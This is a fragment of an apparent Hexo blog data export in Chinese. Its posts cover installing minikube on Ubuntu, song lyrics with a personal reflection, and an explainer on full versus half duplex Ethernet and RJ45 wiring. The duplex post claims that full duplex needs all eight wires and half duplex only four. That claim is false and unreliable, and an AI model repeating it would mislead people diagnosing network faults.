'minikube delete' to delete this one.\n?  Starting existing virtualbox VM for \"minikube\" ...\n⌛  Waiting for the host to be provisioned ...\n⚠️  VM is unable to access k8s.gcr.io, you may need to configure a proxy or set --image-repository\n?  正在 Docker '18.09.9' 中准备 Kubernetes v1.16.2…\n?  Relaunching Kubernetes using kubeadm ... \n⌛  Waiting for: apiserver\n?  完成！kubectl 已经配置至 \"minikube\"\n?  为获得最佳结果，请安装 kubectl：https://kubernetes.io/docs/tasks/tools/install-kubectl/</code></pre>\n</div>\n</div>\n</div>\n</div>\n</div>\n<h5>4.查看状态minikube，连接ssh</h5>\n<pre><code class=\"language-shell\" data-lang=\"shell\">key1088@key1088-Vostro-3459:~$ minikube status\nhost: Running\nkubelet: Running\napiserver: Running\nkubeconfig: Configured\n\n</code>key1088@key1088-Vostro-3459:~$ minikube ssh _ _ _ _ ( ) ( ) ___ ___ (_) ___ (_)| |/') _ _ | |_ __ /' _ ` _ `\\| |/' _ `\\| || , &lt; ( ) ( )| '_`\\ /'__`\\ | ( ) ( ) || || ( ) || || |\\`\\ | (_) || |_) )( ___/ (_) (_) (_)(_)(_) (_)(_)(_) (_)`\\___/'(_,__/'`\\____)</pre>\n<pre><code class=\"language-shell\" data-lang=\"shell\"></code></pre>\n$ exit\n<pre><code class=\"language-shell\" data-lang=\"shell\"></code></pre>\n<h5>5.启动dashboard</h5>\n<h5><code class=\"language-shell\" data-lang=\"shell\">添加PATH变量</code></h5>\n<h5>export PATH=$PATH:$HOME/.minikube/cache/v1.16.2/<code class=\"language-shell\" data-lang=\"shell\">\n</code><code class=\"language-shell\" data-lang=\"shell\">minikube dashboard</code></h5>\n</div>\n<img class=\"alignnone size-full wp-image-605\" src=\"/images/2019/11/2019-11-27-22-46-48屏幕截图.png\" alt=\"\" width=\"1287\" height=\"639\" />\n\n参考：https://minikube.sigs.k8s.io/docs/start/linux/\n\n</div>","source":"_posts/Ubuntu-安装minikebe.md","raw":"title: Ubuntu 安装minikebe\ncategories: [操作系统,Linux,容器]\ntags: [k8s,minikube]\ndate: 2019-11-26 23:22:00\n---\n&nbsp;\n<h5>1.下载并安装</h5>\n<code class=\"language-shell\" data-lang=\"shell\">curl -LO https://storage.googleapis.com/minikube/releases/latest/minikube_1.5.2.deb \\\n&amp;&amp; sudo dpkg -i minikube_1.5.2.deb</code>\n\n2.查看是否支持虚拟化\n<div class=\"highlight\">\n<h5><code class=\"language-shell\" data-lang=\"shell\">egrep -q 'vmx|svm' /proc/cpuinfo &amp;&amp; echo yes || echo no</code></h5>\n3.启动minikebe，需要网络下载\n<div class=\"highlight\">\n<pre><code class=\"language-shell\" data-lang=\"shell\">1)本地运行\n\nsudo minikube start --vm-driver=none</code> <code class=\"language-shell\" data-lang=\"shell\">2)使用vbox运行（不能使用root用户，vbox非不能用root）</code></pre>\n<div class=\"highlight\">\n<pre><code class=\"language-shell\" data-lang=\"shell\">minikube start --vm-driver=virtualbox</code> <code class=\"language-shell\" data-lang=\"shell\">3)设置默认运行环境\n</code><code class=\"language-shell\" data-lang=\"shell\">sudo minikube config set vm-driver none</code></pre>\n<div class=\"code-tabs\">\n<div class=\"tab-content\">\n<div class=\"tab-pane active\" title=\"虚拟盒子\">\n<div class=\"highlight\">\n<div class=\"code-tabs\">\n<div class=\"tab-content\">\n<div class=\"tab-pane active\" title=\"无（裸金属）\">\n<div class=\"highlight\">\n<pre><code class=\"language-shell\" data-lang=\"shell\">or</code></pre>\n</div>\n</div>\n</div>\n</div>\n<pre><code class=\"language-shell\" data-lang=\"shell\">minikube config set vm-driver virtualbox\n\n4)国内网络限制，使用aliyun的资源\n</code></pre>\n<pre><code>minikube start --vm-driver=virtualbox --image-mirror-country=cn \n?  Ubuntu 18.04 上的 minikube v1.5.2\n?  Tip: Use 'minikube start -p &lt;name&gt;' to create a new cluster, or 'minikube delete' to delete this one.\n?  Starting existing virtualbox VM for \"minikube\" ...\n⌛  Waiting for the host to be provisioned ...\n⚠️  VM is unable to access k8s.gcr.io, you may need to configure a proxy or set --image-repository\n?  正在 Docker '18.09.9' 中准备 Kubernetes v1.16.2…\n?  Relaunching Kubernetes using kubeadm ... \n⌛  Waiting for: apiserver\n?  完成！kubectl 已经配置至 \"minikube\"\n?  为获得最佳结果，请安装 kubectl：https://kubernetes.io/docs/tasks/tools/install-kubectl/</code></pre>\n</div>\n</div>\n</div>\n</div>\n</div>\n<h5>4.查看状态minikube，连接ssh</h5>\n<pre><code class=\"language-shell\" data-lang=\"shell\">key1088@key1088-Vostro-3459:~$ minikube status\nhost: Running\nkubelet: Running\napiserver: Running\nkubeconfig: Configured\n\n</code>key1088@key1088-Vostro-3459:~$ minikube ssh _ _ _ _ ( ) ( ) ___ ___ (_) ___ (_)| |/') _ _ | |_ __ /' _ ` _ `\\| |/' _ `\\| || , &lt; ( ) ( )| '_`\\ /'__`\\ | ( ) ( ) || || ( ) || || |\\`\\ | (_) || |_) )( ___/ (_) (_) (_)(_)(_) (_)(_)(_) (_)`\\___/'(_,__/'`\\____)</pre>\n<pre><code class=\"language-shell\" data-lang=\"shell\"></code></pre>\n$ exit\n<pre><code class=\"language-shell\" data-lang=\"shell\"></code></pre>\n<h5>5.启动dashboard</h5>\n<h5><code class=\"language-shell\" data-lang=\"shell\">添加PATH变量</code></h5>\n<h5>export PATH=$PATH:$HOME/.minikube/cache/v1.16.2/<code class=\"language-shell\" data-lang=\"shell\">\n</code><code class=\"language-shell\" data-lang=\"shell\">minikube dashboard</code></h5>\n</div>\n<img class=\"alignnone size-full wp-image-605\" src=\"/images/2019/11/2019-11-27-22-46-48屏幕截图.png\" alt=\"\" width=\"1287\" height=\"639\" />\n\n参考：https://minikube.sigs.k8s.io/docs/start/linux/\n\n</div>","slug":"Ubuntu-安装minikebe","published":1,"updated":"2023-04-22T05:38:44.701Z","_id":"clgrjlxjq007h7opi7tbidusj","comments":1,"layout":"post","photos":[],"link":"","content":"<p>&amp;nbsp;</p>\n<h5>1.下载并安装</h5>\n<code class=\"language-shell\" data-lang=\"shell\">curl -LO https://storage.googleapis.com/minikube/releases/latest/minikube_1.5.2.deb \\\n&amp;&amp; sudo dpkg -i minikube_1.5.2.deb</code>\n\n<p>2.查看是否支持虚拟化</p>\n<div class=\"highlight\">\n<h5><code class=\"language-shell\" data-lang=\"shell\">egrep -q 'vmx|svm' /proc/cpuinfo &amp;&amp; echo yes || echo no</code></h5>\n3.启动minikebe，需要网络下载\n<div class=\"highlight\">\n<pre><code class=\"language-shell\" data-lang=\"shell\">1)本地运行\n\n<p>sudo minikube start –vm-driver&#x3D;none</code> <code class=\"language-shell\" data-lang=\"shell\">2)使用vbox运行（不能使用root用户，vbox非不能用root）</code></pre></p>\n<div class=\"highlight\">\n<pre><code class=\"language-shell\" data-lang=\"shell\">minikube start --vm-driver=virtualbox</code> <code class=\"language-shell\" data-lang=\"shell\">3)设置默认运行环境\n</code><code class=\"language-shell\" data-lang=\"shell\">sudo minikube config set vm-driver none</code></pre>\n<div class=\"code-tabs\">\n<div class=\"tab-content\">\n<div class=\"tab-pane active\" title=\"虚拟盒子\">\n<div class=\"highlight\">\n<div class=\"code-tabs\">\n<div class=\"tab-content\">\n<div class=\"tab-pane active\" title=\"无（裸金属）\">\n<div class=\"highlight\">\n<pre><code class=\"language-shell\" data-lang=\"shell\">or</code></pre>\n</div>\n</div>\n</div>\n</div>\n<pre><code class=\"language-shell\" data-lang=\"shell\">minikube config set vm-driver virtualbox\n\n<p>4)国内网络限制，使用aliyun的资源<br></code></pre></p>\n<pre><code>minikube start --vm-driver=virtualbox --image-mirror-country=cn \n?  Ubuntu 18.04 上的 minikube v1.5.2\n?  Tip: Use 'minikube start -p &lt;name&gt;' to create a new cluster, or 'minikube delete' to delete this one.\n?  Starting existing virtualbox VM for \"minikube\" ...\n⌛  Waiting for the host to be provisioned ...\n⚠️  VM is unable to access k8s.gcr.io, you may need to configure a proxy or set --image-repository\n?  正在 Docker '18.09.9' 中准备 Kubernetes v1.16.2…\n?  Relaunching Kubernetes using kubeadm ... \n⌛  Waiting for: apiserver\n?  完成！kubectl 已经配置至 \"minikube\"\n?  为获得最佳结果，请安装 kubectl：https://kubernetes.io/docs/tasks/tools/install-kubectl/</code></pre>\n</div>\n</div>\n</div>\n</div>\n</div>\n<h5>4.查看状态minikube，连接ssh</h5>\n<pre><code class=\"language-shell\" data-lang=\"shell\">key1088@key1088-Vostro-3459:~$ minikube status\nhost: Running\nkubelet: Running\napiserver: Running\nkubeconfig: Configured\n\n<p></code>key1088@key1088-Vostro-3459:~$ minikube ssh _ _ _ _ ( ) ( ) ___ ___ (<em>) ___ (</em>)| |&#x2F;‘) _ _ | |_ __ &#x2F;‘ _ <code>_</code>| |&#x2F;‘ _ <code>\\| || , &amp;lt; ( ) ( )| &#39;_</code>\\ &#x2F;‘_<em><code>\\ | ( ) ( ) || || ( ) || || |\\</code>\\ | (</em>) || |<em>) )( <em>_<em>&#x2F; (</em>) (_) (</em>)(</em>)(<em>) (</em>)(<em>)(</em>) (<em>)<code>\\___/&#39;(_,__/&#39;</code>_</em>__)</pre></p>\n<pre><code class=\"language-shell\" data-lang=\"shell\"></code></pre>\n<p>$ exit</p>\n<pre><code class=\"language-shell\" data-lang=\"shell\"></code></pre>\n<h5>5.启动dashboard</h5>\n<h5><code class=\"language-shell\" data-lang=\"shell\">添加PATH变量</code></h5>\n<h5>export PATH=$PATH:$HOME/.minikube/cache/v1.16.2/<code class=\"language-shell\" data-lang=\"shell\">\n</code><code class=\"language-shell\" data-lang=\"shell\">minikube dashboard</code></h5>\n</div>\n<img class=\"alignnone size-full wp-image-605\" src=\"/images/2019/11/2019-11-27-22-46-48屏幕截图.png\" alt=\"\" width=\"1287\" height=\"639\" />\n\n<p>参考：<a href=\"https://minikube.sigs.k8s.io/docs/start/linux/\">https://minikube.sigs.k8s.io/docs/start/linux/</a></p>\n</div>","site":{"data":{}},"excerpt":"","more":"<p>&amp;nbsp;</p>\n<h5>1.下载并安装</h5>\n<code class=\"language-shell\" data-lang=\"shell\">curl -LO https://storage.googleapis.com/minikube/releases/latest/minikube_1.5.2.deb \\\n&amp;&amp; sudo dpkg -i minikube_1.5.2.deb</code>\n\n<p>2.查看是否支持虚拟化</p>\n<div class=\"highlight\">\n<h5><code class=\"language-shell\" data-lang=\"shell\">egrep -q 'vmx|svm' /proc/cpuinfo &amp;&amp; echo yes || echo no</code></h5>\n3.启动minikebe，需要网络下载\n<div class=\"highlight\">\n<pre><code class=\"language-shell\" data-lang=\"shell\">1)本地运行\n\n<p>sudo minikube start –vm-driver&#x3D;none</code> <code class=\"language-shell\" data-lang=\"shell\">2)使用vbox运行（不能使用root用户，vbox非不能用root）</code></pre></p>\n<div class=\"highlight\">\n<pre><code class=\"language-shell\" data-lang=\"shell\">minikube start --vm-driver=virtualbox</code> <code class=\"language-shell\" data-lang=\"shell\">3)设置默认运行环境\n</code><code class=\"language-shell\" data-lang=\"shell\">sudo minikube config set vm-driver none</code></pre>\n<div class=\"code-tabs\">\n<div class=\"tab-content\">\n<div class=\"tab-pane active\" title=\"虚拟盒子\">\n<div class=\"highlight\">\n<div class=\"code-tabs\">\n<div class=\"tab-content\">\n<div class=\"tab-pane active\" title=\"无（裸金属）\">\n<div class=\"highlight\">\n<pre><code class=\"language-shell\" data-lang=\"shell\">or</code></pre>\n</div>\n</div>\n</div>\n</div>\n<pre><code class=\"language-shell\" data-lang=\"shell\">minikube config set vm-driver virtualbox\n\n<p>4)国内网络限制，使用aliyun的资源<br></code></pre></p>\n<pre><code>minikube start --vm-driver=virtualbox --image-mirror-country=cn \n?  Ubuntu 18.04 上的 minikube v1.5.2\n?  Tip: Use 'minikube start -p &lt;name&gt;' to create a new cluster, or 'minikube delete' to delete this one.\n?  Starting existing virtualbox VM for \"minikube\" ...\n⌛  Waiting for the host to be provisioned ...\n⚠️  VM is unable to access k8s.gcr.io, you may need to configure a proxy or set --image-repository\n?  正在 Docker '18.09.9' 中准备 Kubernetes v1.16.2…\n?  Relaunching Kubernetes using kubeadm ... \n⌛  Waiting for: apiserver\n?  完成！kubectl 已经配置至 \"minikube\"\n?  为获得最佳结果，请安装 kubectl：https://kubernetes.io/docs/tasks/tools/install-kubectl/</code></pre>\n</div>\n</div>\n</div>\n</div>\n</div>\n<h5>4.查看状态minikube，连接ssh</h5>\n<pre><code class=\"language-shell\" data-lang=\"shell\">key1088@key1088-Vostro-3459:~$ minikube status\nhost: Running\nkubelet: Running\napiserver: Running\nkubeconfig: Configured\n\n<p></code>key1088@key1088-Vostro-3459:~$ minikube ssh _ _ _ _ ( ) ( ) ___ ___ (<em>) ___ (</em>)| |&#x2F;‘) _ _ | |_ __ &#x2F;‘ _ <code>_</code>| |&#x2F;‘ _ <code>\\| || , &amp;lt; ( ) ( )| &#39;_</code>\\ &#x2F;‘_<em><code>\\ | ( ) ( ) || || ( ) || || |\\</code>\\ | (</em>) || |<em>) )( <em>_<em>&#x2F; (</em>) (_) (</em>)(</em>)(<em>) (</em>)(<em>)(</em>) (<em>)<code>\\___/&#39;(_,__/&#39;</code>_</em>__)</pre></p>\n<pre><code class=\"language-shell\" data-lang=\"shell\"></code></pre>\n<p>$ exit</p>\n<pre><code class=\"language-shell\" data-lang=\"shell\"></code></pre>\n<h5>5.启动dashboard</h5>\n<h5><code class=\"language-shell\" data-lang=\"shell\">添加PATH变量</code></h5>\n<h5>export PATH=$PATH:$HOME/.minikube/cache/v1.16.2/<code class=\"language-shell\" data-lang=\"shell\">\n</code><code class=\"language-shell\" data-lang=\"shell\">minikube dashboard</code></h5>\n</div>\n<img class=\"alignnone size-full wp-image-605\" src=\"/images/2019/11/2019-11-27-22-46-48屏幕截图.png\" alt=\"\" width=\"1287\" height=\"639\" />\n\n<p>参考：<a href=\"https://minikube.sigs.k8s.io/docs/start/linux/\">https://minikube.sigs.k8s.io/docs/start/linux/</a></p>\n</div>"},{"title":"你为什么是穷人","date":"2010-04-11T06:31:00.000Z","_content":"<br /> <br />","source":"_posts/你为什么是穷人.md","raw":"title: 你为什么是穷人\ncategories: [生活感想]\ntags: []\ndate: 2010-04-11 14:31:00\n---\n<br /> <br />","slug":"你为什么是穷人","published":1,"updated":"2023-04-22T05:38:44.979Z","_id":"clgrjlxjr007i7opi3o974v0k","comments":1,"layout":"post","photos":[],"link":"","content":"<p><br /> <br /></p>\n","site":{"data":{}},"excerpt":"","more":"<p><br /> <br /></p>\n"},{"title":"假如","date":"2010-04-04T10:00:00.000Z","_content":"歌名 假如<br />演唱 信乐团<br />一份爱能承受多少的误解<br />熬过飘雪的冬天<br />一句话能撕裂多深的牵连<br />变的比陌生人还遥远<br />最初的爱越像火焰<br />最后越会被风熄灭<br />有时候真话太尖锐<br />有人只好说著谎言<br />假如时光到流 我能做什么<br />找你没说的 却想要的<br />假如我不放手 你多年以后<br />会怪我恨我 或感动<br />想假如 是最空虚的痛<br />一个人要看过 几次爱凋谢<br />才甘心在孤独里冬眠<br />最初的爱越像火焰<br />最后越会被风熄灭<br />有时候真话太尖锐<br />有人只好说著谎言<br />假如时光到流 我能做什么<br />找你没说的 却想要的<br />假如我不放手 你多年以后<br />会怪我恨我 或感动<br />想假如 是最空虚的痛<br />为什么幸福 都是幻梦<br />一靠近天堂 也就快醒了<br />或许爱情 更像落叶<br />看似飞翔却在坠落<br />假如时光到流 我能做什么<br />找你没说的 却想要的<br />假如我不放手 你多年以后<br />会怪我恨我 或感动<br />假如真可以让时光到流 你会做什么<br />一样选择我 或不抱我<br />假如温柔放手 你是否懂得<br />走错了可以 再回头<br />想假如<br />是无力的寂寞 <br /><br />这么熟的歌，居然没有认真看过它的歌词。<br />写的真棒!写出了我矛盾的心声。<br />假如时光到流 我能做什么 找你没说的 却想要的<br />假如我不放手 你多年以后，会怪我恨我<br />假如温柔放手 你是否懂得。<br />想假如，是无力的寂寞。。","source":"_posts/假如.md","raw":"title: 假如\ncategories: [生活感想]\ntags: []\ndate: 2010-04-04 18:00:00\n---\n歌名 假如<br />演唱 信乐团<br />一份爱能承受多少的误解<br />熬过飘雪的冬天<br />一句话能撕裂多深的牵连<br />变的比陌生人还遥远<br />最初的爱越像火焰<br />最后越会被风熄灭<br />有时候真话太尖锐<br />有人只好说著谎言<br />假如时光到流 我能做什么<br />找你没说的 却想要的<br />假如我不放手 你多年以后<br />会怪我恨我 或感动<br />想假如 是最空虚的痛<br />一个人要看过 几次爱凋谢<br />才甘心在孤独里冬眠<br />最初的爱越像火焰<br />最后越会被风熄灭<br />有时候真话太尖锐<br />有人只好说著谎言<br />假如时光到流 我能做什么<br />找你没说的 却想要的<br />假如我不放手 你多年以后<br />会怪我恨我 或感动<br />想假如 是最空虚的痛<br />为什么幸福 都是幻梦<br />一靠近天堂 也就快醒了<br />或许爱情 更像落叶<br />看似飞翔却在坠落<br />假如时光到流 我能做什么<br />找你没说的 却想要的<br />假如我不放手 你多年以后<br />会怪我恨我 或感动<br />假如真可以让时光到流 你会做什么<br />一样选择我 或不抱我<br />假如温柔放手 你是否懂得<br />走错了可以 再回头<br />想假如<br />是无力的寂寞 <br /><br />这么熟的歌，居然没有认真看过它的歌词。<br />写的真棒!写出了我矛盾的心声。<br />假如时光到流 我能做什么 找你没说的 却想要的<br />假如我不放手 你多年以后，会怪我恨我<br />假如温柔放手 你是否懂得。<br />想假如，是无力的寂寞。。","slug":"假如","published":1,"updated":"2023-04-22T05:38:44.993Z","_id":"clgrjlxjs007l7opi6d7wcn9u","comments":1,"layout":"post","photos":[],"link":"","content":"<p>歌名 假如<br />演唱 信乐团<br />一份爱能承受多少的误解<br />熬过飘雪的冬天<br />一句话能撕裂多深的牵连<br />变的比陌生人还遥远<br />最初的爱越像火焰<br />最后越会被风熄灭<br />有时候真话太尖锐<br />有人只好说著谎言<br />假如时光到流 我能做什么<br />找你没说的 却想要的<br />假如我不放手 你多年以后<br />会怪我恨我 或感动<br />想假如 是最空虚的痛<br />一个人要看过 几次爱凋谢<br />才甘心在孤独里冬眠<br />最初的爱越像火焰<br />最后越会被风熄灭<br />有时候真话太尖锐<br />有人只好说著谎言<br />假如时光到流 我能做什么<br />找你没说的 却想要的<br />假如我不放手 你多年以后<br />会怪我恨我 或感动<br />想假如 是最空虚的痛<br />为什么幸福 都是幻梦<br />一靠近天堂 也就快醒了<br />或许爱情 更像落叶<br />看似飞翔却在坠落<br />假如时光到流 我能做什么<br />找你没说的 却想要的<br />假如我不放手 你多年以后<br />会怪我恨我 或感动<br />假如真可以让时光到流 你会做什么<br />一样选择我 或不抱我<br />假如温柔放手 你是否懂得<br />走错了可以 再回头<br />想假如<br />是无力的寂寞 <br /><br />这么熟的歌，居然没有认真看过它的歌词。<br />写的真棒!写出了我矛盾的心声。<br />假如时光到流 我能做什么 找你没说的 却想要的<br />假如我不放手 你多年以后，会怪我恨我<br />假如温柔放手 你是否懂得。<br />想假如，是无力的寂寞。。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>歌名 假如<br />演唱 信乐团<br />一份爱能承受多少的误解<br />熬过飘雪的冬天<br />一句话能撕裂多深的牵连<br />变的比陌生人还遥远<br />最初的爱越像火焰<br />最后越会被风熄灭<br />有时候真话太尖锐<br />有人只好说著谎言<br />假如时光到流 我能做什么<br />找你没说的 却想要的<br />假如我不放手 你多年以后<br />会怪我恨我 或感动<br />想假如 是最空虚的痛<br />一个人要看过 几次爱凋谢<br />才甘心在孤独里冬眠<br />最初的爱越像火焰<br />最后越会被风熄灭<br />有时候真话太尖锐<br />有人只好说著谎言<br />假如时光到流 我能做什么<br />找你没说的 却想要的<br />假如我不放手 你多年以后<br />会怪我恨我 或感动<br />想假如 是最空虚的痛<br />为什么幸福 都是幻梦<br />一靠近天堂 也就快醒了<br />或许爱情 更像落叶<br />看似飞翔却在坠落<br />假如时光到流 我能做什么<br />找你没说的 却想要的<br />假如我不放手 你多年以后<br />会怪我恨我 或感动<br />假如真可以让时光到流 你会做什么<br />一样选择我 或不抱我<br />假如温柔放手 你是否懂得<br />走错了可以 再回头<br />想假如<br />是无力的寂寞 <br /><br />这么熟的歌，居然没有认真看过它的歌词。<br />写的真棒!写出了我矛盾的心声。<br />假如时光到流 我能做什么 找你没说的 却想要的<br />假如我不放手 你多年以后，会怪我恨我<br />假如温柔放手 你是否懂得。<br />想假如，是无力的寂寞。。</p>\n"},{"title":"全双工与半双工的区别 网线水晶头 排线顺序","date":"2012-11-13T14:07:00.000Z","_content":"<p>今天回家网络出问题了，播不号了，pppoe一直连接着。感觉网线坏了或者对端交换机口DOWN了，于是叫小区宽带工作人员看看。他大爷的让我重起计算机，哥以前也是学网络的啊，重启管毛，忽悠哥阿。于是把他给弄到家来了，让他看看。他连接也不行，最后修改了一下网卡属性，为10M半双工，我晕好了，好尴尬阿。他走了，百度之，原来是线有问题了，安&#39;普的破线，假的吧。应该是8根线坏了几根，搞的全双工不行了，只能半双工了。速度肯定不行阿，这个问题感觉应该也是自动协商的BUG把，没有初始化一下吗。废话不多说，看下面的吧。<br /></p><p><br /></p><p><br /></p><div><div>全双工与半双工的区别&nbsp;网线水晶头&nbsp;排线顺序</div><div>全双工传输<p style=\"\">英文写法是:Full－Duplex&nbsp;Transmissions</p><p style=\"\">是指交换机在发送数据的同时也能够接收数据，两者同步进行，这好像我们平时打电话一样，说话的同时也能够听到对方的声音。目前的交换机都支持全双工。<br /><br />全双工的好处在于迟延小，速度快。<br /><br />与之对应的是【半双工】这个概念:就是指一个时间段内只有一个动作发生，举个简单例子，一天窄窄的马路，同时只能有一辆车通过，当目前有两量车对开，这种情况下就只能一辆先过，等到头儿后另一辆再开，这个例子就形象的说明了半双工的原理。早期的对讲机、以及早期集线器等设备都是实行半双工的产品。随着技术的不断进步，半双工会逐渐退出历史舞台。</p><strong>全双工与半双工</strong><p style=\"\">&nbsp;&nbsp;&nbsp;在串行通信中,数据通常是在两个站(如终端和微机)之间进行传送,按照数据流的方向可分成三种基本的传送方式:全双工、半双工、和单工.但单工目前已很少采用,下面仅介绍前两种方式.&nbsp;<br /><br />1&nbsp;、全双工方式(&nbsp;full&nbsp;duplex&nbsp;)<br />&nbsp;&nbsp;&nbsp;当数据的发送和接收分流,分别由两根不同的传输线传送时,通信双方都能在同一时刻进行发送和接收操作,这样的传送方式就是全双工制.在全双工方式下,通信系统的每一端都设置了发送器和接收器,因此,能控制数据同时在两个方向上传送.全双工方式无需进行方向的切换,因此,没有切换操作所产生的时间延迟,这对那些不能有时间延误的交互式应用(例如远程监测和控制系统)十分有利.这种方式要求通讯双方均有发送器和接收器,同时,需要&nbsp;2&nbsp;根数据线传送数据信号.(可能还需要控制线和状态线,以及地线).&nbsp;<br /><br />&nbsp;&nbsp;&nbsp;比如,计算机主机用串行接口连接显示终端,而显示终端带有键盘.这样,一方面键盘上输入的字符送到主机内存;另一方面,主机内存的信息可以送到屏幕显示.通常,往键盘上打入&nbsp;1&nbsp;个字符以后,先不显示,计算机主机收到字符后,立即回送到终端,然后终端再把这个字符显示出来.这样,前一个字符的回送过程和后一个字符的输入过程是同时进行的,即工作于全双工方式.&nbsp;<br /><br />2&nbsp;、半双式方式(&nbsp;half&nbsp;duplex&nbsp;)&nbsp;<br />&nbsp;&nbsp;&nbsp;若使用同一根传输线既作接收又作发送,虽然数据可以在两个方向上传送,但通信双方不能同时收发数据,这样的传送方式就是半双工制.采用半双工方式时,通信系统每一端的发送器和接收器,通过收&nbsp;/&nbsp;发开关转接到通信线上,进行方向的切换,因此,会产生时间延迟.收&nbsp;/&nbsp;发开关实际上是由软件控制的电子开关.&nbsp;<br />当计算机主机用串行接口连接显示终端时,在半双工方式中,输入过程和输出过程使用同一通路.有些计算机和显示终端之间采用半双工方式工作,这时,从键盘打入的字符在发送到主机的同时就被送到终端上显示出来,而不是用回送的办法,所以避免了接收过程和发送过程同时进行的情况.&nbsp;<br /><br />&nbsp;&nbsp;&nbsp;目前多数终端和串行接口都为半双工方式提供了换向能力,也为全双工方式提供了两条独立的引脚.在实际使用时,一般并不需要通信双方同时既发送又接收,像打印机这类的单向传送设备,半双工甚至单工就能胜任,也无需倒向.</p><p style=\"\"><strong>全双工模式和半双工模式在网卡中的区别&nbsp;<br /><br /></strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在全双工模式下，8根线都要分别接到水晶头相应的线序位置上；<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在半双工模式下，只需接4根线，参照T568B标准，一般使用1&nbsp;、2、3、6&nbsp;线序位置上的四根线，即：白橙、橙、白绿、绿&nbsp;四根线；<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;白橙、橙&nbsp;用于发送数据&nbsp;，白绿、绿&nbsp;用于接收数据。&nbsp;&nbsp;&nbsp;&nbsp;<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;全双工模式下，网线最大可以达到100兆以上的速度；<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在半双工模式下，网线能达到的速度通常为10兆左右。<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;全双工模式的网线既可以工作于全双工模式，也可以工作于半双工模式；<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;但半双工模式的网线不能工作于全双工模式。<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在半双工模式下，多出来的两组线可以用来接电话线，比如：把“白蓝、蓝”&nbsp;这组线分出来当电话线使用。<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在局域网网络布线中，用这种方式可以节省布线成本，一根双绞线同时当网线和电话线使用。<br /><br /><strong>巧用网卡的半双工模式解决网络连接故障</strong><br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果一根全双工模式的网线内部有一根或几根线短路或接触不良，比如蓝色线组或棕色线组有问题，那么，把网卡改为半双工模式，就可以避免使用有问题的蓝色线组或棕色线组，从而解决网络连接不稳定、掉线等故障。<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在网卡属性中可以设置全双工或半双工模式。</p><img src=\"/images/pic/811921753912b31bc2f5e6888618367adbb4e109.jpg\" /><p style=\"\"><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如上图所示，用鼠标右键单击“本地连接”，在弹出菜单中点击“属性”，进入“本地连接&nbsp;属性”界面；<br />点击（网卡）“配置”按钮，点“高级”标签，选中“Speed&nbsp;＆&nbsp;Duplex”；<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;可用的模式一般有“Auto”&nbsp;、“10&nbsp;Mb&nbsp;Half”&nbsp;、“10&nbsp;Mb&nbsp;Full”&nbsp;、“100&nbsp;Mb&nbsp;Half&nbsp;”、“100&nbsp;Mb&nbsp;Full”等。<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;默认设置为auto&nbsp;。<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果网络连接有问题，比如：<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;不能自动获得IP地址；<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;显示网络连接受限制；<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;手动设置IP地址后，虽然显示网络连接正常，但是只有发送的数据包，没有收到的数据包，或者收到的数据包非常少。<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;那么，修改“Speed&nbsp;＆&nbsp;Duplex”的“值”为&nbsp;“10&nbsp;Mb&nbsp;Half”&nbsp;，也可以改为“10&nbsp;Mb&nbsp;Full”&nbsp;、“100&nbsp;Mb&nbsp;Half&nbsp;”模式试试；<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;用这种方法可以解决大部分网络连接故障。<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果这种方法没能解决问题，就只有更换网线或水晶头，甚至更换网卡了！<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;由于半双工模式下，对网速有一定影响，因此，如果网线、网卡或交换机等设备没有问题，尽量让网\n","source":"_posts/全双工与半双工的区别-网线水晶头-排线顺序.md","raw":"title: 全双工与半双工的区别 网线水晶头 排线顺序\ncategories: [网络工程]\ntags: []\ndate: 2012-11-13 22:07:00\n---\n<p>今天回家网络出问题了，播不号了，pppoe一直连接着。感觉网线坏了或者对端交换机口DOWN了，于是叫小区宽带工作人员看看。他大爷的让我重起计算机，哥以前也是学网络的啊，重启管毛，忽悠哥阿。于是把他给弄到家来了，让他看看。他连接也不行，最后修改了一下网卡属性，为10M半双工，我晕好了，好尴尬阿。他走了，百度之，原来是线有问题了，安&#39;普的破线，假的吧。应该是8根线坏了几根，搞的全双工不行了，只能半双工了。速度肯定不行阿，这个问题感觉应该也是自动协商的BUG把，没有初始化一下吗。废话不多说，看下面的吧。<br /></p><p><br /></p><p><br /></p><div><div>全双工与半双工的区别&nbsp;网线水晶头&nbsp;排线顺序</div><div>全双工传输<p style=\"\">英文写法是:Full－Duplex&nbsp;Transmissions</p><p style=\"\">是指交换机在发送数据的同时也能够接收数据，两者同步进行，这好像我们平时打电话一样，说话的同时也能够听到对方的声音。目前的交换机都支持全双工。<br /><br />全双工的好处在于迟延小，速度快。<br /><br />与之对应的是【半双工】这个概念:就是指一个时间段内只有一个动作发生，举个简单例子，一天窄窄的马路，同时只能有一辆车通过，当目前有两量车对开，这种情况下就只能一辆先过，等到头儿后另一辆再开，这个例子就形象的说明了半双工的原理。早期的对讲机、以及早期集线器等设备都是实行半双工的产品。随着技术的不断进步，半双工会逐渐退出历史舞台。</p><strong>全双工与半双工</strong><p 